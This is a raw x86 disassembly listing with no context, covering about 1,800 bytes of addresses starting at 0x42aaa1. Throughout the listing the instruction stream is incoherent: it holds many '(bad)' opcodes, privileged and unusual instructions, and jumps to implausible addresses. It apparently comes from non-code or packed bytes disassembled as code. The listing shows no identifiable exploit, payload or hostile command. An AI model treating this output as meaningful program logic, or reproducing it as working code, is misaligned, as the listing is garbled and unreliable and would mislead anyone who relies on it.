  42aaa1:	dec    DWORD PTR [edi]
  42aaa3:	clc    
  42aaa4:	out    0x45,eax
  42aaa6:	add    BYTE PTR [eax],cl
  42aaa8:	cmp    ebx,0xffffff8c
  42aaab:	jge    0x42aaad
  42aaad:	jb     0x42aabf
  42aaaf:	je     0x51ab2f
  42aab5:	pop    edx
  42aab6:	push   esi
  42aab7:	mov    ecx,DWORD PTR [edi]
  42aab9:	in     al,dx
  42aaba:	rol    DWORD PTR [ebp+0x0],1
  42aabd:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  42aac4:	cmp    DWORD PTR [ecx],0xfffffff0
  42aac7:	hlt    
  42aac8:	mov    esp,DWORD PTR [eax+0xf034d2b]
  42aace:	(bad)  
  42aad0:	push   eax
  42aad1:	jns    0xb8428f4f
  42aad7:	lock push cs
  42aad9:	ror    edx,0x3
  42aadc:	test   BYTE PTR [ecx+0x5500e800],cl
  42aae2:	dec    eax
  42aae3:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  42aae7:	(bad)  
  42aae8:	mov    esi,0x7f33ff5f
  42aaed:	inc    eax
  42aaee:	test   DWORD PTR [edx],eax
  42aaf0:	je     0x42aab2
  42aaf2:	mov    ecx,ecx
  42aaf4:	adc    DWORD PTR [ebp-0xc],0xffffffec
  42aaf8:	and    eax,DWORD PTR [eax+0xf0103]
  42aafe:	jp     0x42aaec
  42ab00:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  42ab04:	add    edx,DWORD PTR [edi+0x74]
  42ab07:	sbb    BYTE PTR [ebp+0x4d001484],cl
  42ab0d:	add    BYTE PTR [ebp-0x74c48bbb],al
  42ab13:	je     0x42aa98
  42ab15:	cmp    eax,edi
  42ab17:	js     0x42ab3c
  42ab19:	add    eax,0xeb0fc003
  42ab1e:	jns    0x42aaab
  42ab20:	vmread DWORD PTR [ecx+0x45],ebx
  42ab24:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  42ab2a:	adc    al,0x8b
  42ab2c:	jge    0x42ab42
  42ab2e:	mov    edi,DWORD PTR [eax-0x4]
  42ab31:	add    edi,DWORD PTR [edi]
  42ab33:	or     bh,bh
  42ab35:	push   ebp
  42ab36:	push   es
  42ab37:	mov    DWORD PTR [ebp-0x4],ebx
  42ab3a:	add    edi,esi
  42ab3c:	pop    es
  42ab3d:	add    esi,DWORD PTR [edi-0x48ccf183]
  42ab43:	mov    DWORD PTR [esp+esi*8],ecx
  42ab46:	inc    ebp
  42ab47:	pop    ebp
  42ab48:	xor    DWORD PTR [esi-0x4],0x3b
  42ab4c:	add    edx,DWORD PTR [ecx+edi*1]
  42ab4f:	push   es
  42ab50:	clc    
  42ab51:	mov    bh,0xdb
  42ab53:	jp     0x42ab0c
  42ab55:	add    cl,BYTE PTR [esi]
  42ab57:	div    DWORD PTR [edi+0x4d8b0c1c]
  42ab5d:	test   edi,edi
  42ab5f:	je     0x42ab55
  42ab61:	mov    eax,ecx
  42ab63:	or     BYTE PTR [ebx],al
  42ab65:	dec    BYTE PTR [ecx+0x7d3bec7d]
  42ab6b:	jbe    0x42abdf
  42ab6d:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  42ab73:	add    ecx,DWORD PTR [esi]
  42ab75:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  42ab7b:	add    eax,DWORD PTR [ebx-0x287af783]
  42ab81:	je     0x42abd0
  42ab83:	mov    DWORD PTR [ecx],edi
  42ab85:	mov    esi,eax
  42ab87:	hlt    
  42ab88:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  42ab8f:	jb     0x42ab51
  42ab91:	jmp    0x42ab7e
  42ab93:	xor    esi,DWORD PTR [ebx]
  42ab95:	pop    edi
  42ab96:	pop    esi
  42ab97:	pop    ebx
  42ab98:	ret    
  42ab99:	ret    0x8b
  42ab9c:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  42aba2:	xor    DWORD PTR ds:0x89339c0c,0x56
  42aba9:	cld    
  42abaa:	cmp    DWORD PTR [ebp+0xf],eax
  42abad:	xor    al,0x85
  42abaf:	pushf  
  42abb0:	add    BYTE PTR [ebx+0x4d0cfc8b],cl
  42abb6:	ret    
  42abb7:	mov    edi,DWORD PTR [esi-0x4]
  42abba:	pop    eax
  42abbb:	dec    ebp
  42abbc:	jne    0x42ab49
  42abbe:	xor    edi,esp
  42abc0:	inc    eax
  42abc1:	dec    ebp
  42abc2:	jbe    0x42ac17
  42abc4:	inc    eax
  42abc5:	pop    ebp
  42abc6:	add    edx,DWORD PTR [esi+0x8]
  42abc9:	push   edi
  42abca:	dec    eax
  42abcb:	push   ecx
  42abcc:	mov    eax,edi
  42abce:	and    al,0xf0
  42abd0:	jo     0x42abbd
  42abd2:	mov    eax,DWORD PTR [ebx]
  42abd4:	sbb    BYTE PTR [ebp+0x4d],cl
  42abd7:	mov    eax,DWORD PTR [ebx]
  42abd9:	nop
  42abda:	or     BYTE PTR [eax],al
  42abdc:	jne    0x42ac35
  42abde:	cmp    ebx,DWORD PTR [esi+0x33893277]
  42abe4:	cld    
  42abe5:	xor    edi,edi
  42abe7:	add    edi,DWORD PTR [ebp+0x3]
  42abea:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  42abf0:	js     0x42ab76
  42abf2:	jae    0x42abf6
  42abf4:	(bad)  
  42abf6:	xor    al,0x5d
  42abf8:	jmp    0x42ab85
  42abfa:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  42ac01:	fdecstp 
  42ac03:	test   BYTE PTR [edi],ah
  42ac05:	add    bh,BYTE PTR [ebp+0x0]
  42ac08:	add    ebx,DWORD PTR [ebp-0x77]
  42ac0b:	mov    edi,eax
  42ac0d:	cmp    al,0x0
  42ac10:	adc    dh,BYTE PTR [ebx]
  42ac12:	jge    0x42ac17
  42ac14:	mov    edi,DWORD PTR [ebx]
  42ac16:	jl     0x42ac27
  42ac18:	clc    
  42ac19:	dec    edi
  42ac1a:	jge    0x42ac1c
  42ac1c:	mov    eax,DWORD PTR [ebx]
  42ac1e:	jb     0x42ac28
  42ac20:	mov    ecx,DWORD PTR [ebp-0x8]
  42ac23:	mov    edi,edi
  42ac25:	xor    edx,DWORD PTR [eax]
  42ac27:	add    edi,DWORD PTR [ebx]
  42ac29:	mov    DWORD PTR [ebp-0x10],edi
  42ac2c:	inc    edi
  42ac2d:	pop    ebp
  42ac2e:	jge    0x42ac6b
  42ac30:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  42ac34:	mov    edx,0xc05d87f0
  42ac39:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  42ac3d:	fimul  WORD PTR [eax]
  42ac3f:	fist   WORD PTR [ebp+0x1c]
  42ac42:	in     al,dx
  42ac43:	jne    0x42ac31
  42ac45:	mov    edi,DWORD PTR [edx-0x7a27a10]
  42ac4b:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  42ac4f:	fdivp  st(0),st
  42ac51:	fild   WORD PTR [ebp+0x4510f85c]
  42ac57:	test   BYTE PTR [ebx+0x4d00fc02],cl
  42ac5d:	inc    ebp
  42ac5e:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  42ac64:	mov    ebp,DWORD PTR [ebx-0x4]
  42ac67:	adc    al,0x8b
  42ac69:	rcl    DWORD PTR [eax],0x48
  42ac6c:	mov    esi,0x7080803
  42ac71:	fiadd  WORD PTR [ebp+0x4d]
  42ac74:	(bad)  
  42ac75:	mov    edx,DWORD PTR [edx-0x4]
  42ac78:	mov    edx,DWORD PTR [ebp-0x4]
  42ac7b:	xor    ebx,DWORD PTR [ebx+0x330103]
  42ac81:	mov    DWORD PTR [edi+0x872dc],edi
  42ac87:	xlat   BYTE PTR ds:[ebx]
  42ac88:	into   
  42ac89:	ffreep st(6)
  42ac8b:	retf   0x6c7
  42ac8e:	iret   
  42ac8f:	dec    ebp
  42ac90:	inc    ebp
  42ac91:	mov    DWORD PTR [ebx],edi
  42ac93:	fmul   QWORD PTR [edi]
  42ac95:	dec    ebp
  42ac96:	jnp    0x42accb
  42ac98:	add    BYTE PTR [ebx],al
  42ac9a:	mov    ecx,DWORD PTR [esp+edi*8]
  42ac9d:	inc    ebp
  42ac9e:	dec    ebp
  42ac9f:	lea    esi,[ebx]
  42aca1:	add    DWORD PTR [ebx],eax
  42aca3:	jb     0x42ace0
  42aca5:	add    BYTE PTR [edi],cl
  42aca7:	inc    ebp
  42aca8:	imul   eax,edi,0x858bd800
  42acae:	cld    
  42acaf:	clc    
  42acb0:	mov    DWORD PTR [ebp+0x0],eax
  42acb3:	inc    DWORD PTR [eax]
  42acb5:	or     al,0xde
  42acb7:	sbb    bh,0x1
  42acba:	retf   
  42acbb:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  42acc2:	dec    ebp
  42acc3:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  42acc9:	enter  0x12de,0xdf
  42accd:	inc    ebp
  42acce:	pop    ebp
  42accf:	dec    DWORD PTR [ebx-0x257f0ff4]
  42acd5:	add    DWORD PTR [edx],edx
  42acd7:	add    BYTE PTR [ebp+0x50],dl
  42acda:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  42ace0:	xor    ecx,DWORD PTR [ebx+eax*1+0xac73966]
  42ace7:	loopne 0x42ad00
  42ace9:	cdq    
  42acea:	push   ebp
  42aceb:	clc    
  42acec:	mov    eax,DWORD PTR [ebp-0x4]
  42acef:	xor    edx,edx
  42acf1:	add    esi,DWORD PTR [ebx]
  42acf3:	cmp    eax,DWORD PTR [ebx]
  42acf5:	hlt    
  42acf6:	cmp    DWORD PTR [ebx],esp
  42acf8:	or     al,BYTE PTR [ebp+0xf]
  42acfb:	mov    eax,DWORD PTR [edx]
  42acfd:	loopne 0x42acff
  42acff:	(bad)  
  42ad00:	mov    ecx,esi
  42ad02:	cld    
  42ad03:	pushf  
  42ad04:	pop    ebp
  42ad05:	sahf   
  42ad06:	mov    esi,DWORD PTR [edx]
  42ad08:	lock mov eax,eax
  42ad0b:	adc    BYTE PTR [ebx],al
  42ad0d:	or     BYTE PTR [ebx+0x4d001001],0xcf
  42ad14:	xor    ebp,DWORD PTR [edi+0x50e45189]
  42ad1a:	dec    ebp
  42ad1b:	mov    ecx,DWORD PTR [ebx-0x31390304]
  42ad21:	(bad)  
  42ad22:	iret   
  42ad23:	inc    ebp
  42ad24:	(bad)  
  42ad25:	jne    0x42ad74
  42ad27:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  42ad2d:	(bad)  
  42ad2e:	cmp    ebx,eax
  42ad30:	je     0x42acb8
  42ad32:	add    edi,edi
  42ad34:	or     bh,bh
  42ad36:	dec    ebp
  42ad37:	inc    ebp
  42ad38:	mov    esi,DWORD PTR [ebx]
  42ad3a:	cld    
  42ad3b:	add    ecx,esi
  42ad3d:	cmp    ecx,DWORD PTR [eax-0xc]
  42ad40:	mov    edx,DWORD PTR [edi]
  42ad42:	or     BYTE PTR [ebp-0x7c],al
  42ad45:	mov    ebx,DWORD PTR [esi-0x7639cd18]
  42ad4b:	test   BYTE PTR [esi+ebx*4],cl
  42ad4e:	inc    ebp
  42ad4f:	xor    dh,BYTE PTR [eax]
  42ad51:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  42ad58:	jne    0x42ad21
  42ad5a:	mov    ebp,esp
  42ad5c:	fcomp  DWORD PTR [ebx]
  42ad5e:	add    BYTE PTR [ecx],al
  42ad60:	inc    DWORD PTR [ebp-0x75]
  42ad63:	(bad)  
  42ad64:	cld    
  42ad65:	add    al,0xce
  42ad67:	mov    ecx,edi
  42ad69:	cld    
  42ad6a:	inc    ebp
  42ad6b:	fidivr WORD PTR [ebx]
  42ad6d:	fbstp  TBYTE PTR [ebp-0x3e]
  42ad70:	mov    eax,DWORD PTR [eax]
  42ad72:	adc    BYTE PTR [ebx-0x3974038b],cl
  42ad78:	fadd   st,st(7)
  42ad7a:	add    BYTE PTR [ebp-0x1],al
  42ad7d:	mov    ecx,DWORD PTR [esp+edi*8]
  42ad80:	inc    ebp
  42ad81:	mov    bh,0xc7
  42ad84:	loopne 0x42adcb
  42ad86:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  42ad8c:	sbb    al,0x33
  42ad8e:	pushf  
  42ad8f:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  42ad95:	mov    eax,edi
  42ad97:	cwde   
  42ad98:	inc    ebp
  42ad99:	inc    ebp
  42ad9a:	jne    0x42ad27
  42ad9c:	mov    esp,esp
  42ad9e:	clc    
  42ad9f:	add    al,0x4d
  42ada1:	mov    DWORD PTR [ebx],esi
  42ada3:	or     al,0x33
  42ada5:	inc    ebp
  42ada6:	lea    ecx,[ebx-0x398d13fd]
  42adac:	add    bh,al
  42adae:	inc    ebp
  42adaf:	ror    DWORD PTR [ebx+0x45d829],0x8b
  42adb6:	add    ebp,esp
  42adb8:	shufps xmm1,xmm3,0xc7
  42adbc:	(bad)  
  42adbd:	jmp    0x7487e8e6
  42adc2:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  42adc8:	hlt    
  42adc9:	mov    ecx,DWORD PTR [edi]
  42adcb:	fadd   DWORD PTR [ebp+0x0]
  42adce:	xor    ecx,DWORD PTR [edi]
  42add0:	add    ecx,ecx
  42add2:	cmp    edi,edi
  42add4:	pmuludq mm7,QWORD PTR [edx+0x50]
  42add8:	(bad)  
  42add9:	jmp    0x42ad66
  42addb:	mov    edi,esp
  42addd:	or     al,0xc6
  42addf:	inc    ebp
  42ade0:	(bad)  
  42ade1:	mov    eax,DWORD PTR [ebp+0x10]
  42ade4:	jne    0x42ad6f
  42ade6:	mov    eax,DWORD PTR [ecx]
  42ade8:	clc    
  42ade9:	add    BYTE PTR [ebp-0x40],cl
  42adec:	xor    edx,DWORD PTR [eax-0x73]
  42adef:	jne    0x42adf2
  42adf1:	push   DWORD PTR [edx+0x8]
  42adf4:	add    BYTE PTR [ebp+0x45],al
  42adf7:	mov    ebp,ecx
  42adf9:	cld    
  42adfa:	add    BYTE PTR [ebp+0x0],cl
  42adfd:	xor    eax,DWORD PTR [ebp+0x3]
  42ae00:	lea    edi,[ebx]
  42ae02:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  42ae08:	sub    eax,0x5d330e4d
  42ae0d:	lea    esi,[ebx]
  42ae0f:	add    DWORD PTR [ebx],eax
  42ae11:	jb     0x42adfc
  42ae13:	add    BYTE PTR [eax],al
  42ae15:	inc    ebp
  42ae16:	add    bl,ch
  42ae18:	inc    ebp
  42ae19:	mov    esi,DWORD PTR [ebx]
  42ae1b:	or     al,0x3
  42ae1d:	(bad)  
  42ae1e:	mov    edi,eax
  42ae20:	in     al,dx
  42ae21:	scas   eax,DWORD PTR es:[edi]
  42ae22:	inc    ebp
  42ae23:	mov    esi,DWORD PTR [ebx]
  42ae25:	in     al,0x3
  42ae27:	add    al,0x89
  42ae29:	mov    ecx,DWORD PTR [eax+edi*8]
  42ae2c:	dec    ebp
  42ae2d:	(bad)  
  42ae2e:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3162]
  42ae35:	mov    ecx,eax
  42ae37:	cld    
  42ae38:	push   es
  42ae39:	dec    ebp
  42ae3a:	add    al,0x33
  42ae3c:	mov    DWORD PTR [ebx],eax
  42ae3e:	in     al,dx
  42ae3f:	cmp    DWORD PTR [ebp-0x67],eax
  42ae42:	mov    eax,DWORD PTR [ebp-0xba0068]
  42ae48:	mov    edx,DWORD PTR [ebp-0x4]
  42ae4b:	mov    ecx,DWORD PTR [ebp-0x18]
  42ae4e:	xor    ecx,DWORD PTR [ebp+0x3]
  42ae51:	cmp    DWORD PTR [ebx],0x8b32749d
  42ae57:	xor    edi,esp
  42ae59:	jmp    0xff76abab
  42ae5e:	add    ecx,DWORD PTR [ebp-0x3f]
  42ae61:	xor    ebx,DWORD PTR [edi]
  42ae63:	add    eax,ecx
  42ae65:	cmp    ebx,DWORD PTR [eax]
  42ae67:	mov    ecx,DWORD PTR [ebp-0x4]
  42ae6a:	mov    ecx,DWORD PTR [eax]
  42ae6c:	adc    BYTE PTR [ebp-0x80],al
  42ae6f:	jmp    0x42ae72
  42ae71:	mov    eax,DWORD PTR [eax]
  42ae73:	cld    
  42ae74:	mov    bh,0xc6
  42ae76:	push   ecx
  42ae77:	(bad)  
  42ae78:	jne    0x42aed8
  42ae7a:	dec    ecx
  42ae7c:	or     BYTE PTR [ecx+ebx*1],cl
  42ae7f:	push   ebp
  42ae80:	inc    ebp
  42ae81:	in     al,dx
  42ae82:	add    ebp,esp
  42ae84:	or     bh,al
  42ae86:	dec    ebp
  42ae87:	cld    
  42ae88:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  42ae8e:	xor    DWORD PTR [edx+eax*1],0xffffff9c
  42ae92:	dec    DWORD PTR [ebx+0x45510cf4]
  42ae98:	mov    DWORD PTR [ebx+0x5745fc0c],ecx
  42ae9e:	mov    edx,DWORD PTR [ecx+0xc]
  42aea1:	xor    eax,esi
  42aea3:	mov    edx,0xc172c7
  42aea8:	inc    ebp
  42aea9:	mov    esi,DWORD PTR [ebp+0x8]
  42aeac:	mov    eax,edx
  42aeae:	call   0x84c775a3
  42aeb3:	add    DWORD PTR [esi-0x76bace00],ebx
  42aeb9:	mov    ebp,eax
  42aebb:	or     BYTE PTR [eax],dl
  42aebd:	jo     0x42af0c
  42aebf:	push   edi
  42aec0:	xor    esi,DWORD PTR [ebp+0x3]
  42aec3:	(bad)  
  42aec4:	pmulhuw mm0,mm1
  42aec7:	test   DWORD PTR [ebp-0x8],ecx
  42aeca:	mov    DWORD PTR [ebp-0x67],eax
  42aecd:	mov    eax,DWORD PTR [ebp-0x4]
  42aed0:	xor    edi,DWORD PTR [ebp-0x73]
  42aed3:	xor    eax,DWORD PTR [ebx]
  42aed5:	xor    esi,DWORD PTR [edx+0x3]
  42aed8:	add    BYTE PTR [ecx],bh
  42aeda:	inc    ebp
  42aedb:	(bad)  
  42aedc:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  42aee2:	mov    DWORD PTR [eax],0x750f0004
  42aee8:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  42aeee:	lock add BYTE PTR [ebp+0x0],al
  42aef2:	mov    esi,DWORD PTR [ebp-0x2c]
  42aef5:	mov    ebp,edx
  42aef7:	or     al,0x72
  42aef9:	ja     0x42aefb
  42aefb:	mov    edx,esi
  42aefd:	cld    
  42aefe:	(bad)  
  42af01:	cli    
  42af02:	mov    esi,DWORD PTR [ebp-0x4]
  42af05:	cmp    ecx,esi
  42af07:	bswap  edi
  42af09:	(bad)
  42af0d:	mov    esi,DWORD PTR [ebp-0x4]
  42af10:	mov    esi,ecx
  42af12:	clc    
  42af13:	repnz add esi,DWORD PTR [ebp+0x45]
  42af17:	push   ebx
  42af18:	xor    eax,DWORD PTR [ebp+0x3]
  42af1b:	xor    bl,BYTE PTR [edi-0x64]
  42af1e:	pop    ebx
  42af1f:	jmp    0x42afe6
  42af24:	mov    esi,DWORD PTR [ebp-0x7d]
  42af27:	xor    ebp,DWORD PTR [eax]
  42af29:	lea    eax,[ebp-0x8]
  42af2c:	xor    eax,0xc7ef9cf2
  42af31:	neg    eax
  42af33:	ins    DWORD PTR es:[edi],dx
  42af34:	test   esi,edi
  42af36:	clc    
  42af37:	pop    esp
  42af38:	inc    ebp
  42af39:	or     BYTE PTR [ecx+0x450f0c7d],cl
  42af3f:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  42af45:	add    cl,al
  42af47:	jne    0x42aee7
  42af49:	mov    esi,DWORD PTR [edx]
  42af4b:	in     al,dx
  42af4c:	push   esi
  42af4d:	xor    BYTE PTR [ebp-0xe],dh
  42af50:	add    edi,esi
  42af52:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  42af58:	add    cl,bh
  42af5a:	mov    edi,DWORD PTR [ebp+0x8]
  42af5d:	mov    DWORD PTR [ebp-0x14],esi
  42af60:	add    esi,DWORD PTR [ebp+0x3c]
  42af63:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  42af69:	mov    ah,0x30
  42af6b:	sahf   
  42af6c:	pushf  
  42af6d:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  42af73:	jne    0x42af00
  42af75:	mov    ecx,DWORD PTR [esp+ebp*8]
  42af78:	icebp  
  42af79:	icebp  
  42af7a:	shl    edx,0xf2
  42af7d:	(bad)  
  42af7e:	mov    ah,0x16
  42af80:	push   0xf8b9375
  42af85:	in     al,dx
  42af86:	jmp    0x42af79
  42af88:	add    dl,dh
  42af8a:	mov    edi,esi
  42af8c:	or     al,0x8
  42af8e:	inc    ebp
  42af8f:	jne    0x42af94
  42af91:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  42af97:	ret    
  42af98:	or     bh,bh
  42af9a:	jge    0x42af84
  42af9c:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  42afa2:	xor    edi,eax
  42afa4:	add    esi,DWORD PTR [ebp-0x77]
  42afa7:	mov    ebx,esp
  42afa9:	clc    
  42afaa:	neg    DWORD PTR [ebp-0x7c]
  42afad:	xor    eax,DWORD PTR [eax]
  42afaf:	cmp    eax,DWORD PTR [eax]
  42afb1:	repz jne 0x42af49
  42afb4:	xor    eax,DWORD PTR [ecx]
  42afb6:	add    ebx,DWORD PTR [eax]
  42afb8:	mov    DWORD PTR [ebp-0x8],eax
  42afbb:	mov    eax,edi
  42afbd:	cld    
  42afbe:	lock pop eax
  42afc0:	test   DWORD PTR [ebx],esi
  42afc2:	clc    
  42afc3:	add    edx,DWORD PTR [edi-0x740bff77]
  42afc9:	fdivp  st(4),st
  42afcb:	test   ecx,esi
  42afcd:	(bad)  
  42afce:	jnp    0x42afcf
  42afd0:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  42afd6:	jae    0x42af63
  42afd8:	sub    edi,esp
  42afda:	(bad)  
  42afdb:	shl    DWORD PTR [eax-0x3e],0x89
  42afdf:	leave  
  42afe0:	call   0x819866ed
  42afe5:	in     al,dx
  42afe6:	(bad)  
  42afe7:	in     al,dx
  42afe8:	add    bh,al
  42afea:	mov    esp,edi
  42afec:	in     al,dx
  42afed:	test   DWORD PTR [ebp-0x8],edi
  42aff0:	mov    eax,DWORD PTR [ebp+0x2b]
  42aff3:	xor    al,0x3
  42aff5:	pushf  
  42aff6:	jnp    0x5731ac2f
  42affc:	xor    edx,DWORD PTR [edi-0x77]
  42afff:	push   ecx
  42b000:	loopne 0x42b035
  42b002:	jne    0x42afbf
  42b004:	mov    esi,DWORD PTR [edx-0x20]
  42b007:	add    BYTE PTR [ebp-0x3d],bh
  42b00a:	xor    eax,DWORD PTR [ebp-0x73]
  42b00d:	mov    edi,DWORD PTR [esi]
  42b00f:	cld    
  42b010:	jb     0x42afd8
  42b012:	add    bl,al
  42b014:	jne    0x42b05b
  42b016:	mov    edx,DWORD PTR [edi-0x10]
  42b019:	jge    0x42b098
  42b01b:	mov    esi,DWORD PTR [ebx]
  42b01d:	lock add ecx,DWORD PTR [ebp+0x3b]
  42b021:	xor    esi,DWORD PTR [ebp-0x77]
  42b024:	mov    esi,eax
  42b026:	lock inc ebp
  42b028:	jge    0x42b05f
  42b02a:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  42b031:	dec    ebp
  42b032:	mov    esi,DWORD PTR [ebx]
  42b034:	loopne 0x42afbf
  42b036:	jge    0x42b030
  42b038:	add    DWORD PTR [ebp-0x7d],eax
  42b03b:	cmc    
  42b03c:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  42b043:	dec    ebp
  42b044:	hlt    
  42b045:	xor    ebx,DWORD PTR [ebp-0x77]
  42b048:	mov    esi,esp
  42b04a:	in     al,0x45
  42b04c:	jge    0x42b07f
  42b04e:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  42b055:	dec    ebp
  42b056:	ins    BYTE PTR es:[edi],dx
  42b057:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  42b05d:	inc    ebp
  42b05e:	hlt    
  42b05f:	xor    eax,0xb88b9f75
  42b064:	add    al,0x95
  42b066:	icebp  
  42b067:	add    dl,dh
  42b069:	mov    DWORD PTR [ebp+0x20],ebx
  42b06c:	cmp    eax,DWORD PTR [ebp+0xf]
  42b06f:	test   DWORD PTR [edi+ecx*1-0x1],edx
  42b073:	fistp  WORD PTR [ebx+0x0]
  42b076:	inc    ebp
  42b077:	mov    ebx,DWORD PTR [edi+0xc]
  42b07a:	add    eax,eax
  42b07c:	inc    ebp
  42b07d:	test   BYTE PTR [ebx],dh
  42b07f:	add    eax,DWORD PTR [ebx]
  42b081:	add    BYTE PTR [esi+0x45],bl
  42b084:	ret    0x85
  42b087:	jnp    0x54433456
  42b08d:	inc    bp
  42b08f:	inc    ebp
  42b090:	xor    eax,0xc78a9cb9
  42b095:	add    ah,bl
  42b097:	xor    eax,DWORD PTR [ebp+0x453bf8b9]
  42b09d:	add    BYTE PTR [ebx+0x3],dl
  42b0a0:	mov    esi,0x708088b
  42b0a5:	cmp    esi,eax
  42b0a7:	setle  BYTE PTR [ecx-0x74fcffce]
  42b0ae:	mov    esp,edi
  42b0b0:	call   0x33cdf602
  42b0b5:	or     BYTE PTR [ebx],al
  42b0b7:	inc    ecx
  42b0b8:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  42b0be:	and    BYTE PTR [ebp-0x7074f0bb],al
  42b0c4:	lock add cl,al
  42b0c7:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  42b0ce:	mov    ch,0x45
  42b0d0:	clc    
  42b0d1:	xor    eax,DWORD PTR [ebp+0x3]
  42b0d4:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  42b0da:	inc    ebp
  42b0db:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  42b0e1:	mov    edi,eax
  42b0e3:	mov    eax,DWORD PTR [ebp+0x3c]
  42b0e6:	mov    ecx,DWORD PTR [eax]
  42b0e8:	hlt    
  42b0e9:	inc    ebp
  42b0ea:	ror    DWORD PTR [ebx+0x818c45],0xf4
  42b0f1:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  42b0f7:	push   ebp
  42b0f8:	mov    edi,DWORD PTR [ebx]
  42b0fa:	in     al,dx
  42b0fb:	jne    0x42b0be
  42b0fd:	mov    eax,DWORD PTR [ebp-0x28]
  42b100:	add    DWORD PTR [eax],0xe8058dec
  42b106:	clc    
  42b107:	mov    eax,DWORD PTR [edi]
  42b109:	clc    
  42b10a:	add    dh,dl
  42b10c:	rol    WORD PTR [ebp-0x1],cl
  42b110:	mov    edx,DWORD PTR [eax+0x8]
  42b113:	jne    0x42b0d5
  42b115:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  42b11c:	inc    ebp
  42b11d:	push   esp
  42b11e:	test   DWORD PTR [ecx+0xf],ecx
  42b121:	sub    edx,esp
  42b123:	add    eax,DWORD PTR [eax]
  42b125:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  42b12b:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  42b132:	mov    eax,DWORD PTR [ecx]
  42b134:	and    BYTE PTR [eax],al
  42b136:	inc    edx
  42b137:	adc    BYTE PTR [eax],al
  42b139:	inc    ebp
  42b13a:	inc    cx
  42b13d:	push   esp
  42b13e:	or     BYTE PTR [ebp+0x0],dh
  42b141:	push   edx
  42b142:	enterw 0xc1,0x4d
  42b147:	mov    esp,DWORD PTR [esi+0x20]
  42b14a:	add    DWORD PTR [ecx-0x7b],eax
  42b14d:	add    eax,DWORD PTR [ebx]
  42b14f:	str    WORD PTR [eax+0x45]
  42b153:	lea    ecx,[ebx+0x45890801]
  42b159:	sbb    BYTE PTR [ebx],al
  42b15b:	dec    ebp
  42b15c:	cmp    al,0xf
  42b15e:	inc    ebp
  42b15f:	push   eax
  42b160:	mov    esi,DWORD PTR [ebx]
  42b162:	push   eax
  42b163:	add    eax,eax
  42b165:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  42b16c:	inc    ebp
  42b16d:	add    BYTE PTR ds:0x8b4d8c00,dh
  42b173:	xor    edx,esp
  42b175:	add    eax,esi
  42b177:	mov    ebx,eax
  42b179:	loopne 0x42b1c0
  42b17b:	dec    ebp
  42b17c:	mov    ecx,DWORD PTR [edi]
  42b17e:	cld    
  42b17f:	push   eax
  42b180:	xchg   DWORD PTR [ebx],esi
  42b182:	add    DWORD PTR [ebx],ebp
  42b184:	add    BYTE PTR [ebx],ch
  42b186:	or     BYTE PTR [ecx],bh
  42b188:	dec    ecx
  42b189:	loopne 0x42b18e
  42b18b:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  42b191:	push   ebp
  42b192:	add    DWORD PTR [ebx+0x55100800],eax
  42b198:	dec    ebp
  42b199:	jmp    0x42b124
  42b19b:	mov    esp,DWORD PTR [eax]
  42b19d:	sbb    dl,dl
  42b19f:	inc    eax
  42b1a0:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  42b1a6:	add    BYTE PTR [ebx+0x74528555],cl
  42b1ac:	push   ebp
  42b1ad:	div    DWORD PTR [ebx]
  42b1af:	and    eax,DWORD PTR [ebx]
  42b1b1:	add    edx,DWORD PTR [edx-0x30]
  42b1b4:	jno    0x42b141
  42b1b6:	inc    DWORD PTR [eax+eiz*1]
  42b1b9:	inc    ebp
  42b1ba:	push   eax
  42b1bb:	push   eax
  42b1bc:	mov    esp,DWORD PTR [edi-0x74beff1c]
  42b1c2:	mov    edi,esp
  42b1c4:	push   eax
  42b1c5:	inc    ebp
  42b1c6:	enter  0x458b,0x8
  42b1ca:	push   ecx
  42b1cb:	(bad)  
  42b1cc:	call   0x10cbba4
  42b1d1:	pop    ss
  42b1d2:	push   ebp
